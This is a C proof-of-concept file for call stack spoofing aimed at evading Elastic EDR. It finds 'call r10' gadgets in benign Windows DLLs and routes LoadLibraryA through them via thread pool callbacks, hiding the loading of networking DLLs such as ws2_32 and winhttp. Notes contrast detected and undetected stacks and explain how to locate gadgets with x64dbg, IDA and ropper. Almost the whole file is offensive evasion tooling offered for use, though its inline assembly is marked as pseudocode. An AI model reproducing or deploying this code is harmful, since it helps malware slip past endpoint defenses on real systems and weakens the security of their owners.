/*
 * Call Stack Spoofing POC - Gadget-Based LoadLibrary
 *
 * Demonstrates evading Elastic EDR call stack signatures by inserting
 * arbitrary module addresses into the call stack using call gadgets.
 *
 * Technique: Instead of calling LoadLibraryA directly, jump to a gadget
 * in a benign DLL that contains "call r10; ret". This puts the gadget's
 * module address on the call stack, breaking detection signatures.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -c gadget_loader.c -o gadget_loader.x64.o
 *
 * With Crystal Palace:
 *   load "gadget_loader.x64.o"
 *     make pic +optimize
 *   link "gadget_loader.bin"
 */

#include <windows.h>

// ============================================================================
// GADGET STRUCTURE
// ============================================================================

typedef struct {
    void* address;              // Gadget address
    BYTE pattern[16];           // Expected bytes
    size_t pattern_length;      // Pattern length
    DWORD stack_cleanup;        // Stack bytes to allocate
} GADGET_INFO;

// ============================================================================
// GADGET FINDER
// ============================================================================

// Find "call r10; xor eax,eax; add rsp,0x28; ret" pattern
GADGET_INFO find_call_r10_gadget(HMODULE hModule) {
    GADGET_INFO gadget = {0};

    // Pattern: call r10; xor eax,eax; add rsp,0x28; ret
    BYTE pattern[] = {
        0x41, 0xFF, 0xD2,       // call r10
        0x33, 0xC0,              // xor eax, eax
        0x48, 0x83, 0xC4, 0x28,  // add rsp, 0x28
        0xC3                     // ret
    };

    if (!hModule) return gadget;

    // Get module info
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + dos_header->e_lfanew
    );

    // Get .text section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    PIMAGE_SECTION_HEADER text_section = NULL;

    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            text_section = &section[i];
            break;
        }
    }

    if (!text_section) return gadget;

    // Scan .text section
    BYTE* start = (BYTE*)hModule + text_section->VirtualAddress;
    SIZE_T size = text_section->Misc.VirtualSize;

    for (SIZE_T i = 0; i < size - sizeof(pattern); i++) {
        if (memcmp(start + i, pattern, sizeof(pattern)) == 0) {
            gadget.address = start + i;
            gadget.pattern_length = sizeof(pattern);
            gadget.stack_cleanup = 0x28;
            memcpy(gadget.pattern, pattern, sizeof(pattern));
            return gadget;
        }
    }

    return gadget;
}

// Generic gadget finder by pattern
GADGET_INFO find_gadget_by_pattern(HMODULE hModule, BYTE* pattern, size_t pattern_len) {
    GADGET_INFO gadget = {0};

    if (!hModule || !pattern) return gadget;

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + dos_header->e_lfanew
    );

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    PIMAGE_SECTION_HEADER text_section = NULL;

    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            text_section = &section[i];
            break;
        }
    }

    if (!text_section) return gadget;

    BYTE* start = (BYTE*)hModule + text_section->VirtualAddress;
    SIZE_T size = text_section->Misc.VirtualSize;

    for (SIZE_T i = 0; i < size - pattern_len; i++) {
        if (memcmp(start + i, pattern, pattern_len) == 0) {
            gadget.address = start + i;
            gadget.pattern_length = pattern_len;
            memcpy(gadget.pattern, pattern, pattern_len);
            return gadget;
        }
    }

    return gadget;
}

// ============================================================================
// GADGET EXECUTOR
// ============================================================================

// Execute function via gadget (assembly stub)
// This would be implemented in assembly for production use
typedef void* (*GADGET_EXECUTOR)(void* gadget, void* function, void* arg1);

// Inline assembly version (for demonstration)
void* execute_via_call_r10_gadget(GADGET_INFO* gadget, void* function, void* arg1) {
    if (!gadget->address) return NULL;

    void* result;

    // This is pseudocode - actual implementation would be pure assembly
    __asm__ volatile (
        "sub rsp, %1\n"         // Allocate stack space
        "mov r10, %2\n"         // Place function in r10
        "mov rcx, %3\n"         // First argument
        "call %4\n"             // Call gadget (which calls r10)
        "mov %0, rax\n"         // Save result
        : "=r"(result)
        : "i"(gadget->stack_cleanup), "r"(function), "r"(arg1), "r"(gadget->address)
        : "rax", "rcx", "r10", "memory"
    );

    return result;
}

// ============================================================================
// THREAD POOL INTEGRATION
// ============================================================================

typedef struct {
    GADGET_INFO gadget;
    void* function;
    void* arg1;
    void* result;
} TP_GADGET_CONTEXT;

VOID CALLBACK TpGadgetCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work
) {
    TP_GADGET_CONTEXT* ctx = (TP_GADGET_CONTEXT*)Context;

    // Execute via gadget instead of direct call
    // This breaks Elastic's call stack signature
    ctx->result = execute_via_call_r10_gadget(
        &ctx->gadget,
        ctx->function,
        ctx->arg1
    );
}

void* execute_via_threadpool_and_gadget(
    GADGET_INFO* gadget,
    void* function,
    void* arg1
) {
    TP_GADGET_CONTEXT context = {0};
    context.gadget = *gadget;
    context.function = function;
    context.arg1 = arg1;

    // Create thread pool work
    PTP_WORK work = CreateThreadpoolWork(TpGadgetCallback, &context, NULL);

    // Submit and wait
    SubmitThreadpoolWork(work);
    WaitForThreadpoolWorkCallbacks(work, FALSE);

    // Cleanup
    CloseThreadpoolWork(work);

    return context.result;
}

// ============================================================================
// HIGH-LEVEL API
// ============================================================================

// Load library via gadget to evade call stack detection
HMODULE evasive_load_library(const char* dll_name) {
    // Try multiple modules for gadgets
    const char* gadget_modules[] = {
        "dsdmo.dll",
        "combase.dll",
        "propsys.dll",
        "apphelp.dll",
        NULL
    };

    GADGET_INFO gadget = {0};

    // Find a suitable gadget
    for (int i = 0; gadget_modules[i] != NULL; i++) {
        HMODULE hMod = LoadLibraryA(gadget_modules[i]);
        if (!hMod) continue;

        gadget = find_call_r10_gadget(hMod);
        if (gadget.address) {
            break;
        }
    }

    if (!gadget.address) {
        // Fallback to direct call (no evasion)
        return LoadLibraryA(dll_name);
    }

    // Execute via thread pool + gadget
    HMODULE result = (HMODULE)execute_via_threadpool_and_gadget(
        &gadget,
        (void*)&LoadLibraryA,
        (void*)dll_name
    );

    return result;
}

// ============================================================================
// USAGE EXAMPLES
// ============================================================================

void example_usage(void) {
    // Example 1: Load network DLL with evasion
    HMODULE hWs2_32 = evasive_load_library("ws2_32.dll");

    if (hWs2_32) {
        // ws2_32 loaded successfully
        // Call stack now contains gadget module instead of standard pattern
    }

    // Example 2: Load multiple DLLs
    HMODULE hWinhttp = evasive_load_library("winhttp.dll");
    HMODULE hWininet = evasive_load_library("wininet.dll");

    // All loaded via gadgets, breaking Elastic signatures

    // Example 3: Manual gadget usage
    HMODULE dsdmo = LoadLibraryA("dsdmo.dll");
    GADGET_INFO gadget = find_call_r10_gadget(dsdmo);

    if (gadget.address) {
        // Execute custom function via gadget
        void* result = execute_via_call_r10_gadget(
            &gadget,
            (void*)&GetProcAddress,
            hWs2_32
        );
    }
}

// ============================================================================
// MAIN ENTRY POINT (for POC)
// ============================================================================

void go(void) {
    // POC: Load network DLL with call stack evasion
    HMODULE hWs2_32 = evasive_load_library("ws2_32.dll");

    if (hWs2_32) {
        // Success - loaded with evasion
        // Elastic signature broken
    }
    else {
        // Fallback failed
    }
}

// ============================================================================
// NOTES
// ============================================================================

/*
 * Stack Analysis:
 *
 * WITHOUT GADGET:
 * [0] ntdll.dll!LdrLoadDll
 * [1] kernelbase.dll!LoadLibraryExW
 * [2] ntdll.dll!TppWorkpExecuteCallback
 * [3] kernel32.dll!BaseThreadInitThunk
 * [4] ntdll.dll!RtlUserThreadStart
 *
 * Pattern: ntdll|kernelbase|ntdll|kernel32|ntdll
 * Status: DETECTED by Elastic
 *
 * WITH GADGET (dsdmo.dll):
 * [0] ntdll.dll!LdrLoadDll
 * [1] dsdmo.dll!<gadget+0>
 * [2] kernelbase.dll!LoadLibraryExW
 * [3] ntdll.dll!TppWorkpExecuteCallback
 * [4] kernel32.dll!BaseThreadInitThunk
 *
 * Pattern: ntdll|dsdmo|kernelbase|ntdll|kernel32
 * Status: NOT DETECTED (signature broken)
 *
 * Alternative Gadget Patterns:
 *
 * Pattern 1: call r10; ret
 * Bytes: 41 FF D2 C3
 * Stack cleanup: 0
 *
 * Pattern 2: call r10; add rsp,0x20; ret
 * Bytes: 41 FF D2 48 83 C4 20 C3
 * Stack cleanup: 0x20
 *
 * Pattern 3: call r10; xor eax,eax; add rsp,0x28; ret
 * Bytes: 41 FF D2 33 C0 48 83 C4 28 C3
 * Stack cleanup: 0x28
 *
 * Finding Gadgets:
 *
 * x64dbg:
 * 1. Load DLL
 * 2. Ctrl+B (binary search)
 * 3. Search for: 41 FF D2
 * 4. Verify ret nearby
 * 5. Note address
 *
 * IDA Pro:
 * 1. Load DLL
 * 2. Alt+B (binary search)
 * 3. Search for pattern
 * 4. Verify control flow
 *
 * ropper:
 * ropper --file dsdmo.dll --search "call r10"
 *
 * Winbindex:
 * 1. Check gadget across Windows versions
 * 2. Verify stability
 * 3. Use signature scanning if offset varies
 */
